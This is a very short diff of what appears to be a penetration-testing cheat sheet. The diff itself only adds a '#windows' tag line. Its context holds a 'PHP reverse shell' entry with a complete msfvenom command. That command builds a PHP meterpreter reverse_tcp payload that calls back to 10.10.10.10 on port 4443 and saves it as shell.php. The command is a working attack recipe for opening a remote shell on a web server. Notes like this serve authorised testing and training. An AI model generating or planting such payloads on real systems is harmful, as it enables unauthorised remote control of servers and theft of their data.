@@ -1,4 +1,4 @@
-
+#windows
 ### PHP reverse shell
 
 `msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f raw -o shell.php`
